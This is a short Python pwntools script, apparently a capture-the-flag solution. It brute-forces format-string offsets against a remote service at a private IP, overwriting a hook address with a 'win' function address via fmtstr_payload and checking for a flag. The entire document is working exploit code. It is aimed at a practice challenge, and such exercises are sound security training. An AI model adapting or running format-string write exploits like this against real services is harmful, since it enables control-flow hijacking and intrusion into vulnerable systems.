from pwn import *

host = "10.213.0.102"
port = "46400"

hook_addr = 0x0804c024
win_addr = 0x080491b6

for offset in range(1, 10):
    try:
        print(f"\n[*] Trying offset {offset}...")
        p = remote(host, port)
        p.recvuntil(b"payload:")
        
        payload = fmtstr_payload(offset, {hook_addr: win_addr})
        p.sendline(payload)
        
        resp = p.recvall(timeout=2)
        if b"WIN!" in resp or b"CTF{" in resp:
            print(f"[+] SUCCESS with offset {offset}!")
            print(resp.decode(errors='ignore'))
            break
        p.close()
    except:
        p.close()